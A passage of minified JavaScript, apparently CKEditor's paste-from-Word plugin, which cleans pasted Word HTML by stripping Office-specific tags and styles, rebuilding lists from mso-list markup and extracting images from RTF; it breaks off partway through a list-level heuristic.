﻿/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function v(){return!1}function z(a,b){var c,d=[];a.filterChildren(b);for(c=a.children.length-1;0<=c;c--)d.unshift(a.children[c]),a.children[c].remove();c=a.attributes;var e=a,f=!0,g;for(g in c)if(f)f=!1;else{var q=new CKEDITOR.htmlParser.element(a.name);q.attributes[g]=c[g];e.add(q);e=q;delete c[g]}for(c=0;c<d.length;c++)e.add(d[c])}function x(a){var b=a.margin?"margin":a.MARGIN?"MARGIN":!1,c,d;if(b){d=CKEDITOR.tools.style.parse.margin(a[b]);for(c in d)a["margin-"+c]=d[c];delete a[b]}}
var h,k,r,p,m=CKEDITOR.tools,A=["o:p","xml","script","meta","link"],B="v:arc v:curve v:line v:oval v:polyline v:rect v:roundrect v:group".split(" "),y={},w=0;CKEDITOR.plugins.pastefromword={};CKEDITOR.cleanWord=function(a,b){function c(a){(a.attributes["o:gfxdata"]||"v:group"===a.parent.name)&&e.push(a.attributes.id)}var d=Boolean(a.match(/mso-list:\s*l\d+\s+level\d+\s+lfo\d+/)),e=[];CKEDITOR.plugins.clipboard.isCustomDataTypesSupported&&(a=CKEDITOR.plugins.pastefromword.styles.inliner.inline(a).getBody().getHtml());
a=a.replace(/<!\[/g,"\x3c!--[").replace(/\]>/g,"]--\x3e");var f=CKEDITOR.htmlParser.fragment.fromHtml(a),g={root:function(a){a.filterChildren(p);CKEDITOR.plugins.pastefromword.lists.cleanup(h.createLists(a))},elementNames:[[/^\?xml:namespace$/,""],[/^v:shapetype/,""],[new RegExp(A.join("|")),""]],elements:{a:function(a){if(a.attributes.name){if("_GoBack"==a.attributes.name){delete a.name;return}if(a.attributes.name.match(/^OLE_LINK\d+$/)){delete a.name;return}}if(a.attributes.href&&a.attributes.href.match(/#.+$/)){var b=
a.attributes.href.match(/#(.+)$/)[1];y[b]=a}a.attributes.name&&y[a.attributes.name]&&(a=y[a.attributes.name],a.attributes.href=a.attributes.href.replace(/.*#(.*)$/,"#$1"))},div:function(a){if(b.plugins.pagebreak&&a.attributes["data-cke-pagebreak"])return a;k.createStyleStack(a,p,b)},img:function(a){if(a.parent&&a.parent.attributes){var b=a.parent.attributes;(b=b.style||b.STYLE)&&b.match(/mso\-list:\s?Ignore/)&&(a.attributes["cke-ignored"]=!0)}k.mapCommonStyles(a);a.attributes.src&&a.attributes.src.match(/^file:\/\//)&&
a.attributes.alt&&a.attributes.alt.match(/^https?:\/\//)&&(a.attributes.src=a.attributes.alt);a=a.attributes["v:shapes"]?a.attributes["v:shapes"].split(" "):[];b=CKEDITOR.tools.array.every(a,function(a){return-1<e.indexOf(a)});if(a.length&&b)return!1},p:function(a){a.filterChildren(p);if(a.attributes.style&&a.attributes.style.match(/display:\s*none/i))return!1;if(h.thisIsAListItem(b,a))r.isEdgeListItem(b,a)&&r.cleanupEdgeListItem(a),h.convertToFakeListItem(b,a),m.array.reduce(a.children,function(a,
b){"p"===b.name&&(0<a&&(new CKEDITOR.htmlParser.element("br")).insertBefore(b),b.replaceWithChildren(),a+=1);return a},0);else{var c=a.getAscendant(function(a){return"ul"==a.name||"ol"==a.name}),e=m.parseCssText(a.attributes.style);c&&!c.attributes["cke-list-level"]&&e["mso-list"]&&e["mso-list"].match(/level/)&&(c.attributes["cke-list-level"]=e["mso-list"].match(/level(\d+)/)[1]);b.config.enterMode==CKEDITOR.ENTER_BR&&(delete a.name,a.add(new CKEDITOR.htmlParser.element("br")))}k.createStyleStack(a,
p,b)},pre:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h1:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h2:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h3:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h4:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h5:function(a){h.thisIsAListItem(b,
a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},h6:function(a){h.thisIsAListItem(b,a)&&h.convertToFakeListItem(b,a);k.createStyleStack(a,p,b)},font:function(a){if(a.getHtml().match(/^\s*$/))return(new CKEDITOR.htmlParser.text(" ")).insertAfter(a),!1;b&&!0===b.config.pasteFromWordRemoveFontStyles&&a.attributes.size&&delete a.attributes.size;CKEDITOR.dtd.tr[a.parent.name]&&CKEDITOR.tools.arrayCompare(CKEDITOR.tools.object.keys(a.attributes),["class","style"])?k.createStyleStack(a,p,b):z(a,
p)},ul:function(a){if(d)return"li"==a.parent.name&&0===m.indexOf(a.parent.children,a)&&k.setStyle(a.parent,"list-style-type","none"),h.dissolveList(a),!1},li:function(a){r.correctLevelShift(a);d&&(a.attributes.style=k.normalizedStyles(a,b),k.pushStylesLower(a))},ol:function(a){if(d)return"li"==a.parent.name&&0===m.indexOf(a.parent.children,a)&&k.setStyle(a.parent,"list-style-type","none"),h.dissolveList(a),!1},span:function(a){a.filterChildren(p);a.attributes.style=k.normalizedStyles(a,b);if(!a.attributes.style||
a.attributes.style.match(/^mso\-bookmark:OLE_LINK\d+$/)||a.getHtml().match(/^(\s|&nbsp;)+$/)){for(var c=a.children.length-1;0<=c;c--)a.children[c].insertAfter(a);return!1}a.attributes.style.match(/FONT-FAMILY:\s*Symbol/i)&&a.forEach(function(a){a.value=a.value.replace(/&nbsp;/g,"")},CKEDITOR.NODE_TEXT,!0);k.createStyleStack(a,p,b)},table:function(a){a.filterChildren(p);var b=a.parent,c=b&&b.parent,e,d;if(b.name&&"div"===b.name&&b.attributes.align&&1===m.object.keys(b.attributes).length&&1===b.children.length){a.attributes.align=
b.attributes.align;e=b.children.splice(0);a.remove();for(d=e.length-1;0<=d;d--)c.add(e[d],b.getIndex());b.remove()}k.convertStyleToPx(a)},tr:function(a){a.attributes={}},td:function(a){var c=a.getAscendant("table"),c=m.parseCssText(c.attributes.style,!0),e=c.background;e&&k.setStyle(a,"background",e,!0);(c=c["background-color"])&&k.setStyle(a,"background-color",c,!0);var c=m.parseCssText(a.attributes.style,!0),e=c.border?CKEDITOR.tools.style.border.fromCssRule(c.border):{},e=m.style.border.splitCssValues(c,
e),d=CKEDITOR.tools.clone(c),f;for(f in d)0==f.indexOf("border")&&delete d[f];a.attributes.style=CKEDITOR.tools.writeCssText(d);c.background&&(f=CKEDITOR.tools.style.parse.background(c.background),f.color&&(k.setStyle(a,"background-color",f.color,!0),k.setStyle(a,"background","")));for(var g in e)f=c[g]?CKEDITOR.tools.style.border.fromCssRule(c[g]):e[g],"none"===f.style?k.setStyle(a,g,"none"):k.setStyle(a,g,f.toString());k.mapCommonStyles(a);k.convertStyleToPx(a);k.createStyleStack(a,p,b,/margin|text\-align|padding|list\-style\-type|width|height|border|white\-space|vertical\-align|background/i)},
"v:imagedata":v,"v:shape":function(a){var b=!1;if(null===a.getFirst("v:imagedata"))c(a);else{a.parent.find(function(c){"img"==c.name&&c.attributes&&c.attributes["v:shapes"]==a.attributes.id&&(b=!0)},!0);if(b)return!1;var e="";"v:group"===a.parent.name?c(a):(a.forEach(function(a){a.attributes&&a.attributes.src&&(e=a.attributes.src)},CKEDITOR.NODE_ELEMENT,!0),a.filterChildren(p),a.name="img",a.attributes.src=a.attributes.src||e,delete a.attributes.type)}},style:function(){return!1},object:function(a){return!(!a.attributes||
!a.attributes.data)},br:function(a){if(b.plugins.pagebreak&&(a=m.parseCssText(a.attributes.style,!0),"always"===a["page-break-before"]||"page"===a["break-before"]))return a=CKEDITOR.plugins.pagebreak.createElement(b),CKEDITOR.htmlParser.fragment.fromHtml(a.getOuterHtml()).children[0]}},attributes:{style:function(a,c){return k.normalizedStyles(c,b)||!1},"class":function(a){a=a.replace(/(el\d+)|(font\d+)|msonormal|msolistparagraph\w*/ig,"");return""===a?!1:a},cellspacing:v,cellpadding:v,border:v,"v:shapes":v,
"o:spid":v},comment:function(a){a.match(/\[if.* supportFields.*\]/)&&w++;"[endif]"==a&&(w=0<w?w-1:0);return!1},text:function(a,b){if(w)return"";var c=b.parent&&b.parent.parent;return c&&c.attributes&&c.attributes.style&&c.attributes.style.match(/mso-list:\s*ignore/i)?a.replace(/&nbsp;/g," "):a}};CKEDITOR.tools.array.forEach(B,function(a){g.elements[a]=c});p=new CKEDITOR.htmlParser.filter(g);var q=new CKEDITOR.htmlParser.basicWriter;p.applyTo(f);f.writeHtml(q);return q.getHtml()};CKEDITOR.plugins.pastefromword.styles=
{setStyle:function(a,b,c,d){var e=m.parseCssText(a.attributes.style);d&&e[b]||(""===c?delete e[b]:e[b]=c,a.attributes.style=CKEDITOR.tools.writeCssText(e))},convertStyleToPx:function(a){var b=a.attributes.style;b&&(a.attributes.style=b.replace(/\d+(\.\d+)?pt/g,function(a){return CKEDITOR.tools.convertToPx(a)+"px"}))},mapStyles:function(a,b){for(var c in b)if(a.attributes[c]){if("function"===typeof b[c])b[c](a.attributes[c]);else k.setStyle(a,b[c],a.attributes[c]);delete a.attributes[c]}},mapCommonStyles:function(a){return k.mapStyles(a,
{vAlign:function(b){k.setStyle(a,"vertical-align",b)},width:function(b){k.setStyle(a,"width",b+"px")},height:function(b){k.setStyle(a,"height",b+"px")}})},normalizedStyles:function(a,b){var c="background-color:transparent border-image:none color:windowtext direction:ltr mso- visibility:visible div:border:none".split(" "),d="font-family font font-size color background-color line-height text-decoration".split(" "),e=function(){for(var a=[],b=0;b<arguments.length;b++)arguments[b]&&a.push(arguments[b]);
return-1!==m.indexOf(c,a.join(":"))},f=b&&!0===b.config.pasteFromWordRemoveFontStyles,g=m.parseCssText(a.attributes.style);"cke:li"==a.name&&(g["TEXT-INDENT"]&&g.MARGIN?(a.attributes["cke-indentation"]=h.getElementIndentation(a),g.MARGIN=g.MARGIN.replace(/(([\w\.]+ ){3,3})[\d\.]+(\w+$)/,"$10$3")):delete g["TEXT-INDENT"],delete g["text-indent"]);for(var q=m.object.keys(g),l=0;l<q.length;l++){var n=q[l].toLowerCase(),t=g[q[l]],k=CKEDITOR.tools.indexOf;(f&&-1!==k(d,n.toLowerCase())||e(null,n,t)||e(null,
n.replace(/\-.*$/,"-"))||e(null,n)||e(a.name,n,t)||e(a.name,n.replace(/\-.*$/,"-"))||e(a.name,n)||e(t))&&delete g[q[l]]}var u=b&&b.config.pasteFromWord_keepZeroMargins;x(g);(function(){CKEDITOR.tools.array.forEach(["top","right","bottom","left"],function(a){a="margin-"+a;if(a in g){var b=CKEDITOR.tools.convertToPx(g[a]);b||u?g[a]=b?b+"px":0:delete g[a]}})})();return CKEDITOR.tools.writeCssText(g)},createStyleStack:function(a,b,c,d){var e=[];a.filterChildren(b);for(b=a.children.length-1;0<=b;b--)e.unshift(a.children[b]),
a.children[b].remove();k.sortStyles(a);b=m.parseCssText(k.normalizedStyles(a,c));c=a;var f="span"===a.name,g;for(g in b)if(!g.match(d||/margin((?!-)|-left|-top|-bottom|-right)|text-indent|text-align|width|border|padding/i))if(f)f=!1;else{var q=new CKEDITOR.htmlParser.element("span");q.attributes.style=g+":"+b[g];c.add(q);c=q;delete b[g]}CKEDITOR.tools.isEmpty(b)?delete a.attributes.style:a.attributes.style=CKEDITOR.tools.writeCssText(b);for(b=0;b<e.length;b++)c.add(e[b])},sortStyles:function(a){for(var b=
["border","border-bottom","font-size","background"],c=m.parseCssText(a.attributes.style),d=m.object.keys(c),e=[],f=[],g=0;g<d.length;g++)-1!==m.indexOf(b,d[g].toLowerCase())?e.push(d[g]):f.push(d[g]);e.sort(function(a,c){var e=m.indexOf(b,a.toLowerCase()),d=m.indexOf(b,c.toLowerCase());return e-d});d=[].concat(e,f);e={};for(g=0;g<d.length;g++)e[d[g]]=c[d[g]];a.attributes.style=CKEDITOR.tools.writeCssText(e)},pushStylesLower:function(a,b,c){if(!a.attributes.style||0===a.children.length)return!1;b=
b||{};var d={"list-style-type":!0,width:!0,height:!0,border:!0,"border-":!0},e=m.parseCssText(a.attributes.style),f;for(f in e)if(!(f.toLowerCase()in d||d[f.toLowerCase().replace(/\-.*$/,"-")]||f.toLowerCase()in b)){for(var g=!1,q=0;q<a.children.length;q++){var l=a.children[q];if(l.type===CKEDITOR.NODE_TEXT&&c){var h=new CKEDITOR.htmlParser.element("span");h.setHtml(l.value);l.replaceWith(h);l=h}l.type===CKEDITOR.NODE_ELEMENT&&(g=!0,k.setStyle(l,f,e[f]))}g&&delete e[f]}a.attributes.style=CKEDITOR.tools.writeCssText(e);
return!0},inliner:{filtered:"break-before break-after break-inside page-break page-break-before page-break-after page-break-inside".split(" "),parse:function(a){function b(a){var b=new CKEDITOR.dom.element("style"),c=new CKEDITOR.dom.element("iframe");c.hide();CKEDITOR.document.getBody().append(c);c.$.contentDocument.documentElement.appendChild(b.$);b.$.textContent=a;c.remove();return b.$.sheet}function c(a){var b=a.indexOf("{"),c=a.indexOf("}");return d(a.substring(b+1,c),!0)}var d=CKEDITOR.tools.parseCssText,
e=CKEDITOR.plugins.pastefromword.styles.inliner.filter,f=a.is?a.$.sheet:b(a);a=[];var g;if(f)for(f=f.cssRules,g=0;g<f.length;g++)f[g].type===window.CSSRule.STYLE_RULE&&a.push({selector:f[g].selectorText,styles:e(c(f[g].cssText))});return a},filter:function(a){var b=CKEDITOR.plugins.pastefromword.styles.inliner.filtered,c=m.array.indexOf,d={},e;for(e in a)-1===c(b,e)&&(d[e]=a[e]);return d},sort:function(a){return a.sort(function(a){var c=CKEDITOR.tools.array.map(a,function(a){return a.selector});return function(a,
b){var f=-1!==(""+a.selector).indexOf(".")?1:0,f=(-1!==(""+b.selector).indexOf(".")?1:0)-f;return 0!==f?f:c.indexOf(b.selector)-c.indexOf(a.selector)}}(a))},inline:function(a){var b=CKEDITOR.plugins.pastefromword.styles.inliner.parse,c=CKEDITOR.plugins.pastefromword.styles.inliner.sort,d=function(a){a=(new DOMParser).parseFromString(a,"text/html");return new CKEDITOR.dom.document(a)}(a);a=d.find("style");c=c(function(a){var c=[],d;for(d=0;d<a.count();d++)c=c.concat(b(a.getItem(d)));return c}(a));
CKEDITOR.tools.array.forEach(c,function(a){var b=a.styles;a=d.find(a.selector);var c,h,l;x(b);for(l=0;l<a.count();l++)c=a.getItem(l),h=CKEDITOR.tools.parseCssText(c.getAttribute("style")),x(h),h=CKEDITOR.tools.extend({},h,b),c.setAttribute("style",CKEDITOR.tools.writeCssText(h))});return d}}};k=CKEDITOR.plugins.pastefromword.styles;CKEDITOR.plugins.pastefromword.lists={thisIsAListItem:function(a,b){return r.isEdgeListItem(a,b)||b.attributes.style&&b.attributes.style.match(/mso\-list:\s?l\d/)&&"li"!==
b.parent.name||b.attributes["cke-dissolved"]||b.getHtml().match(/<!\-\-\[if !supportLists]\-\->/)?!0:!1},convertToFakeListItem:function(a,b){r.isDegenerateListItem(a,b)&&r.assignListLevels(a,b);this.getListItemInfo(b);if(!b.attributes["cke-dissolved"]){var c;b.forEach(function(a){!c&&"img"==a.name&&a.attributes["cke-ignored"]&&"*"==a.attributes.alt&&(c="·",a.remove())},CKEDITOR.NODE_ELEMENT);b.forEach(function(a){c||a.value.match(/^ /)||(c=a.value)},CKEDITOR.NODE_TEXT);if("undefined"==typeof c)return;
b.attributes["cke-symbol"]=c.replace(/(?: |&nbsp;).*$/,"");h.removeSymbolText(b)}var d=b.attributes&&m.parseCssText(b.attributes.style);if(d["margin-left"]){var e=d["margin-left"],f=b.attributes["cke-list-level"];(e=Math.max(CKEDITOR.tools.convertToPx(e)-40*f,0))?d["margin-left"]=e+"px":delete d["margin-left"];b.attributes.style=CKEDITOR.tools.writeCssText(d)}b.name="cke:li"},convertToRealListItems:function(a){var b=[];a.forEach(function(a){"cke:li"==a.name&&(a.name="li",b.push(a))},CKEDITOR.NODE_ELEMENT,
!1);return b},removeSymbolText:function(a){var b=a.attributes["cke-symbol"],c=a.findOne(function(a){return a.value&&-1<a.value.indexOf(b)},!0),d;c&&(c.value=c.value.replace(b,""),d=c.parent,d.getHtml().match(/^(\s|&nbsp;)*$/)&&d!==a?d.remove():c.value||c.remove())},setListSymbol:function(a,b,c){c=c||1;var d=m.parseCssText(a.attributes.style);if("ol"==a.name){if(a.attributes.type||d["list-style-type"])return;var e={"[ivx]":"lower-roman","[IVX]":"upper-roman","[a-z]":"lower-alpha","[A-Z]":"upper-alpha",
"\\d":"decimal"},f;for(f in e)if(h.getSubsectionSymbol(b).match(new RegExp(f))){d["list-style-type"]=e[f];break}a.attributes["cke-list-style-type"]=d["list-style-type"]}else e={"·":"disc",o:"circle","§":"square"},!d["list-style-type"]&&e[b]&&(d["list-style-type"]=e[b]);h.setListSymbol.removeRedundancies(d,c);(a.attributes.style=CKEDITOR.tools.writeCssText(d))||delete a.attributes.style},setListStart:function(a){for(var b=[],c=0,d=0;d<a.children.length;d++)b.push(a.children[d].attributes["cke-symbol"]||
"");b[0]||c++;switch(a.attributes["cke-list-style-type"]){case "lower-roman":case "upper-roman":a.attributes.start=h.toArabic(h.getSubsectionSymbol(b[c]))-c;break;case "lower-alpha":case "upper-alpha":a.attributes.start=h.getSubsectionSymbol(b[c]).replace(/\W/g,"").toLowerCase().charCodeAt(0)-96-c;break;case "decimal":a.attributes.start=parseInt(h.getSubsectionSymbol(b[c]),10)-c||1}"1"==a.attributes.start&&delete a.attributes.start;delete a.attributes["cke-list-style-type"]},numbering:{toNumber:function(a,
b){function c(a){a=a.toUpperCase();for(var b=1,c=1;0<a.length;c*=26)b+="ABCDEFGHIJKLMNOPQRSTUVWXYZ".indexOf(a.charAt(a.length-1))*c,a=a.substr(0,a.length-1);return b}function d(a){var b=[[1E3,"M"],[900,"CM"],[500,"D"],[400,"CD"],[100,"C"],[90,"XC"],[50,"L"],[40,"XL"],[10,"X"],[9,"IX"],[5,"V"],[4,"IV"],[1,"I"]];a=a.toUpperCase();for(var c=b.length,d=0,h=0;h<c;++h)for(var k=b[h],t=k[1].length;a.substr(0,t)==k[1];a=a.substr(t))d+=k[0];return d}return"decimal"==b?Number(a):"upper-roman"==b||"lower-roman"==
b?d(a.toUpperCase()):"lower-alpha"==b||"upper-alpha"==b?c(a):1},getStyle:function(a){a=a.slice(0,1);var b={i:"lower-roman",v:"lower-roman",x:"lower-roman",l:"lower-roman",m:"lower-roman",I:"upper-roman",V:"upper-roman",X:"upper-roman",L:"upper-roman",M:"upper-roman"}[a];b||(b="decimal",a.match(/[a-z]/)&&(b="lower-alpha"),a.match(/[A-Z]/)&&(b="upper-alpha"));return b}},getSubsectionSymbol:function(a){return(a.match(/([\da-zA-Z]+).?$/)||["placeholder","1"])[1]},setListDir:function(a){var b=0,c=0;a.forEach(function(a){"li"==
a.name&&("rtl"==(a.attributes.dir||a.attributes.DIR||"").toLowerCase()?c++:b++)},CKEDITOR.ELEMENT_NODE);c>b&&(a.attributes.dir="rtl")},createList:function(a){return(a.attributes["cke-symbol"].match(/([\da-np-zA-NP-Z]).?/)||[])[1]?new CKEDITOR.htmlParser.element("ol"):new CKEDITOR.htmlParser.element("ul")},createLists:function(a){function b(a){return CKEDITOR.tools.array.reduce(a,function(a,b){if(b.attributes&&b.attributes.style)var c=CKEDITOR.tools.parseCssText(b.attributes.style)["margin-left"];
return c?a+parseInt(c,10):a},0)}var c,d,e,f=h.convertToRealListItems(a);if(0===f.length)return[];var g=h.groupLists(f);for(a=0;a<g.length;a++){var k=g[a],l=k[0];for(e=0;e<k.length;e++)if(1==k[e].attributes["cke-list-level"]){l=k[e];break}var l=[h.createList(l)],n=l[0],t=[l[0]];n.insertBefore(k[0]);for(e=0;e<k.length;e++){c=k[e];for(d=c.attributes["cke-list-level"];d>l.length;){var m=h.createList(c),u=n.children;0<u.length?u[u.length-1].add(m):(u=new CKEDITOR.htmlParser.element("li",{style:"list-style-type:none"}),
u.add(m),n.add(u));l.push(m);t.push(m);n=m;d==l.length&&h.setListSymbol(m,c.attributes["cke-symbol"],d)}for(;d<l.length;)l.pop(),n=l[l.length-1],d==l.length&&h.setListSymbol(n,c.attributes["cke-symbol"],d);c.remove();n.add(c)}l[0].children.length&&(e=l[0].children[0].attributes["cke-symbol"],!e&&1<l[0].children.length&&(e=l[0].children[1].attributes["cke-symbol"]),e&&h.setListSymbol(l[0],e));for(e=0;e<t.length;e++)h.setListStart(t[e]);for(e=0;e<k.length;e++)this.determineListItemValue(k[e])}CKEDITOR.tools.array.forEach(f,
function(a){for(var c=[],d=a.parent;d;)"li"===d.name&&c.push(d),d=d.parent;var c=b(c),e;c&&(a.attributes=a.attributes||{},d=CKEDITOR.tools.parseCssText(a.attributes.style),e=d["margin-left"]||0,(e=Math.max(parseInt(e,10)-c,0))?d["margin-left"]=e+"px":delete d["margin-left"],a.attributes.style=CKEDITOR.tools.writeCssText(d))});return f},cleanup:function(a){var b=["cke-list-level","cke-symbol","cke-list-id","cke-indentation","cke-dissolved"],c,d;for(c=0;c<a.length;c++)for(d=0;d<b.length;d++)delete a[c].attributes[b[d]]},
determineListItemValue:function(a){if("ol"===a.parent.name){var b=this.calculateValue(a),c=a.attributes["cke-symbol"].match(/[a-z0-9]+/gi),d;c&&(c=c[c.length-1],d=a.parent.attributes["cke-list-style-type"]||this.numbering.getStyle(c),c=this.numbering.toNumber(c,d),c!==b&&(a.attributes.value=c))}},calculateValue:function(a){if(!a.parent)return 1;var b=a.parent;a=a.getIndex();var c=null,d,e,f;for(f=a;0<=f&&null===c;f--)e=b.children[f],e.attributes&&void 0!==e.attributes.value&&(d=f,c=parseInt(e.attributes.value,
10));null===c&&(c=void 0!==b.attributes.start?parseInt(b.attributes.start,10):1,d=0);return c+(a-d)},dissolveList:function(a){function b(a){return 50<=a?"l"+b(a-50):40<=a?"xl"+b(a-40):10<=a?"x"+b(a-10):9==a?"ix":5<=a?"v"+b(a-5):4==a?"iv":1<=a?"i"+b(a-1):""}function c(a,b){function c(b,d){return b&&b.parent?a(b.parent)?c(b.parent,d+1):c(b.parent,d):d}return c(b,0)}var d=function(a){return function(b){return b.name==a}},e=function(a){return d("ul")(a)||d("ol")(a)},f=CKEDITOR.tools.array,g=[],h,l;a.forEach(function(a){g.push(a)},
CKEDITOR.NODE_ELEMENT,!1);h=f.filter(g,d("li"));var n=f.filter(g,e);f.forEach(n,function(a){var h=a.attributes.type,g=parseInt(a.attributes.start,10)||1,k=c(e,a)+1;h||(h=m.parseCssText(a.attributes.style)["list-style-type"]);f.forEach(f.filter(a.children,d("li")),function(c,d){var e;switch(h){case "disc":e="·";break;case "circle":e="o";break;case "square":e="§";break;case "1":case "decimal":e=g+d+".";break;case "a":case "lower-alpha":e=String.fromCharCode(97+g-1+d)+".";break;case "A":case "upper-alpha":e=
String.fromCharCode(65+g-1+d)+".";break;case "i":case "lower-roman":e=b(g+d)+".";break;case "I":case "upper-roman":e=b(g+d).toUpperCase()+".";break;default:e="ul"==a.name?"·":g+d+"."}c.attributes["cke-symbol"]=e;c.attributes["cke-list-level"]=k})});h=f.reduce(h,function(a,b){var c=b.children[0];if(c&&c.name&&c.attributes.style&&c.attributes.style.match(/mso-list:/i)){k.pushStylesLower(b,{"list-style-type":!0,display:!0});var d=m.parseCssText(c.attributes.style,!0);k.setStyle(b,"mso-list",d["mso-list"],
!0);k.setStyle(c,"mso-list","");delete b["cke-list-level"];(c=d.display?"display":d.DISPLAY?"DISPLAY":"")&&k.setStyle(b,"display",d[c],!0)}if(1===b.children.length&&e(b.children[0]))return a;b.name="p";b.attributes["cke-dissolved"]=!0;a.push(b);return a},[]);for(l=h.length-1;0<=l;l--)h[l].insertAfter(a);for(l=n.length-1;0<=l;l--)delete n[l].name},groupLists:function(a){var b,c,d=[[a[0]]],e=d[0];c=a[0];c.attributes["cke-indentation"]=c.attributes["cke-indentation"]||h.getElementIndentation(c);for(b=
1;b<a.length;b++){c=a[b];var f=a[b-1];c.attributes["cke-indentation"]=c.attributes["cke-indentation"]||h.getElementIndentation(c);c.previous!==f&&(h.chopDiscontinuousLists(e,d),d.push(e=[]));e.push(c)}h.chopDiscontinuousLists(e,d);return d},chopDiscontinuousLists:function(a,b){for(var c={},d=[[]],e,f=0;f<a.length;f++){var g=c[a[f].attributes["cke-list-level"]],k=this.getListItemInfo(a[f]),l,n;g?(n=g.type.match(/alpha/)&&7==g.index?"alpha":n,n="o"==a[f].attributes["cke-symbol"]&&14==g.index?"alpha":
n,l=h.getSymbolInfo(a[f].attributes["cke-symbol"],n),k=this.getListItemInfo(a[f]),(g.type!=l.type||e&&k.id!=e.id&&!this.isAListContinuation(a[f]))&&d.push([])):l=h.getSymbolInfo(a[f].attributes["cke-symbol"]);for(e=parseInt(a[f].attributes["cke-list-level"],10)+1;20>e;e++)c[e]&&delete c[e];c[a[f].attributes["cke-list-level"]]=l;d[d.length-1].push(a[f]);e=k}[].splice.apply(b,[].concat([m.indexOf(b,a),1],d))},isAListContinuation:function(a){var b=a;do if((b=b.previous)&&b.type===CKEDITOR.NODE_ELEMENT){if(void 0===
b.attributes["cke-list-level"])break;if(b.attributes["cke-list-level"]===a.attributes["cke-list-level"])return b.attributes["cke-list-id"]===a.attributes["cke-list-id"]}while(b);return!1},getElementIndentation:function(a){a=m.parseCssText(a.attributes.style);if(a.margin||a.MARGIN){a.margin=a.margin||a.MARGIN;var b={styles:{margin:a.margin}};CKEDITOR.filter.transformationsTools.splitMarginShorthand(b);a["margin-left"]=b.styles["margin-left"]}return parseInt(m.convertToPx(a["margin-left"]||"0px"),10)},
toArabic:function(a){return a.match(/[ivxl]/i)?a.match(/^l/i)?50+h.toArabic(a.slice(1)):a.match(/^lx/i)?40+h.toArabic(a.slice(1)):a.match(/^x/i)?10+h.toArabic(a.slice(1)):a.match(/^ix/i)?9+h.toArabic(a.slice(2)):a.match(/^v/i)?5+h.toArabic(a.slice(1)):a.match(/^iv/i)?4+h.toArabic(a.slice(2)):a.match(/^i/i)?1+h.toArabic(a.slice(1)):h.toArabic(a.slice(1)):0},getSymbolInfo:function(a,b){var c=a.toUpperCase()==a?"upper-":"lower-",d={"·":["disc",-1],o:["circle",-2],"§":["square",-3]};if(a in d||b&&b.match(/(disc|circle|square)/))return{index:d[a][1],
type:d[a][0]};if(a.match(/\d/))return{index:a?parseInt(h.getSubsectionSymbol(a),10):0,type:"decimal"};a=a.replace(/\W/g,"").toLowerCase();return!b&&a.match(/[ivxl]+/i)||b&&"alpha"!=b||"roman"==b?{index:h.toArabic(a),type:c+"roman"}:a.match(/[a-z]/i)?{index:a.charCodeAt(0)-97,type:c+"alpha"}:{index:-1,type:"disc"}},getListItemInfo:function(a){if(void 0!==a.attributes["cke-list-id"])return{id:a.attributes["cke-list-id"],level:a.attributes["cke-list-level"]};var b=m.parseCssText(a.attributes.style)["mso-list"],
c={id:"0",level:"1"};b&&(b+=" ",c.level=b.match(/level(.+?)\s+/)[1],c.id=b.match(/l(\d+?)\s+/)[1]);a.attributes["cke-list-level"]=void 0!==a.attributes["cke-list-level"]?a.attributes["cke-list-level"]:c.level;a.attributes["cke-list-id"]=c.id;return c}};h=CKEDITOR.plugins.pastefromword.lists;CKEDITOR.plugins.pastefromword.images={extractFromRtf:function(a){var b=[],c=/\{\\pict[\s\S]+?\\bliptag\-?\d+(\\blipupi\-?\d+)?(\{\\\*\\blipuid\s?[\da-fA-F]+)?[\s\}]*?/,d;a=a.match(new RegExp("(?:("+c.source+"))([\\da-fA-F\\s]+)\\}",
"g"));if(!a)return b;for(var e=0;e<a.length;e++)if(c.test(a[e])){if(-1!==a[e].indexOf("\\pngblip"))d="image/png";else if(-1!==a[e].indexOf("\\jpegblip"))d="image/jpeg";else continue;b.push({hex:d?a[e].replace(c,"").replace(/[^\da-fA-F]/g,""):null,type:d})}return b},extractTagsFromHtml:function(a){for(var b=/<img[^>]+src="([^"]+)[^>]+/g,c=[],d;d=b.exec(a);)c.push(d[1]);return c}};CKEDITOR.plugins.pastefromword.heuristics={isEdgeListItem:function(a,b){if(!CKEDITOR.env.edge||!a.config.pasteFromWord_heuristicsEdgeList)return!1;
var c="";b.forEach&&b.forEach(function(a){c+=a.value},CKEDITOR.NODE_TEXT);return c.match(/^(?: |&nbsp;)*\(?[a-zA-Z0-9]+?[\.\)](?: |&nbsp;){2,}/)?!0:r.isDegenerateListItem(a,b)},cleanupEdgeListItem:function(a){var b=!1;a.forEach(function(a){b||(a.value=a.value.replace(/^(?:&nbsp;|[\s])+/,""),a.value.length&&(b=!0))},CKEDITOR.NODE_TEXT)},isDegenerateListItem:function(a,b){return!!b.attributes["cke-list-level"]||b.attributes.style&&!b.attributes.style.match(/mso\-list/)&&!!b.find(function(a){if(a.type==
CKEDITOR.NODE_ELEMENT&&b.name.match(/h\d/i)&&a.getHtml().match(/^[a-zA-Z0-9]+?[\.\)]$/))return!0;var d=m.parseCssText(a.attributes&&a.attributes.style,!0);if(!d)return!1;var e=d["font-family"]||"";return(d.font||d["font-size"]||"").match(/7pt/i)&&!!a.previous||e.match(/symbol/i)},!0).length},assignListLevels:function(a,b){if(!b.attributes||void 0===b.attributes["cke-list-level"]){for(var c=[h.getElementIndentation(b)],d=[b],e=[],f=CKEDITOR.tools.array,g=f.map;b.next&&b.next.attributes&&!b.next.attributes["cke-list-level"]&&
